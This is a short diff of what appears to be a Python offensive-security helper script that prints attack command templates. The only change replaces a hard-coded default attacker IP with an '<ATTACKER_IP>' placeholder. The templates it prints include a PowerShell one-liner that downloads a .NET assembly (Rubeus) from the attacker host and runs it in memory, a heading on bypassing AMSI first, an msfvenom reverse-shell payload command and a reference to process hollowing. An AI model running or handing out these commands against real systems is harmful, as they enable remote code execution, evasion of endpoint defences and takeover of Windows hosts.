@@ -328,7 +328,7 @@ def run():
   $main.Invoke($null, [object[]]@(, [string[]]@('{args}')))
 
   {Y}From URL (in-memory download + execute):{RST}
-  $data = (New-Object Net.WebClient).DownloadData('http://{SESSION.get("attacker_ip","10.10.14.5")}/{assembly.split("/")[-1]}')
+  $data = (New-Object Net.WebClient).DownloadData('http://{SESSION.get("attacker_ip") or "<ATTACKER_IP>"}/{assembly.split("/")[-1]}')
   [System.Reflection.Assembly]::Load($data).GetType('Rubeus.Program').GetMethod('Main').Invoke($null,[object[]]@(,[string[]]@('{args}')))
 
   {Y}Bypass AMSI first, then execute:{RST}
@@ -356,7 +356,7 @@ def run():
 
   {Y}msfvenom shellcode generation:{RST}
   msfvenom -p windows/x64/shell_reverse_tcp \\
-    LHOST={SESSION.get("attacker_ip","10.10.14.5")} LPORT=4444 \\
+    LHOST={SESSION.get("attacker_ip") or "<ATTACKER_IP>"} LPORT=4444 \\
     -f raw -o {payload}
 
   {Y}Ready-made hollowing tools:{RST}
